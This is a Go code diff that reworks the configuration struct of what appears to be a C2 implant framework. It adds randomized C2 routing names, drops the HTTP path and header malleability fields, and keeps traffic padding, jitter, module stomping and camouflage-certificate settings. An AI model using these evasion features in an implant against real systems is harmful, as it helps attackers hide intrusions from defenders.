@@ -13,6 +13,20 @@ func ReadCBORConfig(cborData []byte, config_to_write *Config) (err error) {
 	return cbor.Unmarshal(cborData, config_to_write)
 }
 
+const (
+	// Localhost represents the local loopback address
+	Localhost = "127.0.0.1"
+)
+
+// C2Routing randomized names for each service
+type C2Routing struct {
+	Checkin string `cbor:"1,keyasint"`
+	Msg     string `cbor:"2,keyasint"`
+	FTP     string `cbor:"3,keyasint"`
+	WWW     string `cbor:"4,keyasint"`
+	Proxy   string `cbor:"5,keyasint"`
+}
+
 // Config build.json config file
 type Config struct {
 	CCAddress                 string `cbor:"1,keyasint"`  // Address of C2 server, might include port (agent side)
@@ -53,20 +67,10 @@ type Config struct {
 	AgentTag     string `cbor:"34,keyasint"` // generated from UUID, will be used to identidy agents
 	CCTimeout    int    `cbor:"35,keyasint"` // wait until this amount of milliseconds to re-connect to C2
 
-	// Malleable C2 fields (starting from tag 50)
-	C2Prefix    string            `cbor:"50,keyasint"` // Custom WebRoot (replaces "api")
-	CheckInPath string            `cbor:"51,keyasint"` // Custom CheckInAPI (replaces "checkin")
-	MsgPath     string            `cbor:"52,keyasint"` // Custom MsgAPI (replaces "msg")
-	UserAgent   string            `cbor:"53,keyasint"` // Custom User-Agent
-	C2Headers   map[string]string `cbor:"54,keyasint"` // Custom HTTP headers
-	FTPPath     string            `cbor:"61,keyasint"` // Custom FTP API path (replaces "ftp")
-	WWWPath     string            `cbor:"62,keyasint"` // Custom WWW API path (replaces "www")
-	ProxyPath   string            `cbor:"63,keyasint"` // Custom Proxy API path (replaces "proxy")
-
-	// Traffic Shaping
-	PaddingMin int `cbor:"55,keyasint"`
-	PaddingMax int `cbor:"56,keyasint"`
-	Jitter     int `cbor:"57,keyasint"` // Percent jitter for check-in
+	// Payload-length malleability (padding only — no HTTP path tuning needed)
+	PaddingMin int `cbor:"55,keyasint"` // min bytes of random padding per CBOR frame
+	PaddingMax int `cbor:"56,keyasint"` // max bytes of random padding per CBOR frame
+	Jitter     int `cbor:"57,keyasint"` // percent jitter added to check-in interval
 	// Module Stomping
 	ModulePath    string `cbor:"58,keyasint"` // Path to the module to stomp (overwrite) on the target system
 	IsRunByStager bool   `cbor:"59,keyasint"` // Whether the agent is run by a stager
@@ -81,6 +85,9 @@ type Config struct {
 	P2PTransport      string `cbor:"72,keyasint"` // Transport for P2P mesh (e.g. kcp, mtls)
 	CamouflageCertOrg string `cbor:"73,keyasint"` // Camouflage cert organization (random if empty)
 	CamouflageCertCN  string `cbor:"74,keyasint"` // Camouflage cert common name (random if empty)
+
+	// C2 Routing malleability
+	C2Routes C2Routing `cbor:"75,keyasint"`
 
 	// Runtime state (not persisted in config file)
 	MyAgentToken *AgentToken `cbor:"-"` // Current AgentToken issued by C2
